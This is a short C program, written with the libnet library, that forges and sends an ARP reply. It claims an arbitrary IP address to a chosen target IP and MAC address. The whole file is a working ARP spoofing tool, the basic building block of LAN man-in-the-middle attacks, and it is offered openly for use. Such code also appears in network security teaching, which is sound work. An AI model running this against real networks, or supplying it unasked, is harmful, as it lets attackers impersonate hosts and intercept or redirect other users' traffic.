#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <libnet.h>

void usage(char* name) {
    printf("%s - Send arbitrary ARP replies\n", name);
    printf("Usage: %s [-i interface] -s ip_address -t dest_ip\n", name);
    printf("    -i  interface to send on\n");
    printf("    -s  IP address we are claiming to be\n");
    printf("    -t  IP address of recipient\n");
    printf("    -m  Ethernet MAC address of recipient\n");
    exit(1);
} 

int main(int argc, char* argv[]) {
    char* device = NULL;
    char o;
    in_addr_t ipaddr;       // claimed IP address
    in_addr_t destaddr;     // destination IP address
    uint8_t *macaddr;      // destination MAC address
    libnet_t *l;            // libnet context
    libnet_ptag_t arp=0,eth=0;      // libnet protocol blocks
    struct libnet_ether_addr *hwaddr;   // ethernet MAC address 
    char errbuf[LIBNET_ERRBUF_SIZE];    // error msgs.
    int r;           // generic return values

    if(argc < 3) {
        usage(argv[0]);
    }

    while((o=getopt(argc, argv, "i:t:s:m:")) > 0) {
        switch(o) {
            case 'i':
                device = optarg;
                break;
            case 's':
                if((ipaddr = inet_addr(optarg)) == -1) {
                    fprintf(stderr, "Invalid claimed IP address\n" );
                    usage(argv[0]);
                }    
                break;
            case 't':
                if((destaddr = inet_addr(optarg)) == -1) {
                    fprintf(stderr, "Invalid destination address\n");
                    usage(argv[0]);      
                }    
                break;
            case 'm':
                if((macaddr = libnet_hex_aton(optarg, &r)) == NULL) {
                    fprintf(stderr, "Error on MAC address\n");
                    usage(argv[0]);
                }    
                break;
            default:
                usage(argv[0]);
                break;    
        }
    }

    /* open context */
    l = libnet_init(LIBNET_LINK, device, errbuf);
    if(l==NULL) {
        fprintf(stderr, "Error opening context: %s", errbuf);
        exit(1);
    }

    /* get the hardware address for the card we're using */
    hwaddr = libnet_get_hwaddr(l);
    
    /* build the ARP header */
    arp = libnet_autobuild_arp(ARPOP_REPLY,             // ARP msg type
                        (uint8_t *)hwaddr,             // source MAC address
                        (uint8_t *)&ipaddr,            // source IP address
                        macaddr,                        // destination MAC address
                        (uint8_t *)&destaddr,           // destination IP address
                        l);                             // current context

    if(arp == -1) {
        fprintf(stderr, "Unable to build ARP header: %s\n", libnet_geterror(l));
        exit(1);
    }

    /* build the ethernet header */
    eth = libnet_build_ethernet(macaddr,                 // destination hardware address
                               (uint8_t *)hwaddr,      // source hardware address
                               ETHERTYPE_ARP,           // type of encapsulated packet
                               NULL,                    // pointer to payload
                               0,                       // size of payload
                               l,                       // libnet context
                               0);                      // libnet protocol tag

    if(eth == -1) {
        fprintf(stderr, "Unable to build ethernet header: %s\n", libnet_geterror(l));
        exit(1);
    }

    /* Write the packet */
    if((libnet_write(l)) == -1) {
        fprintf(stderr, "Unable to send packet: %s\n", libnet_geterror(l));
        exit(1);
    }

    /* exit */
    libnet_destroy(l);
    return 0;
}
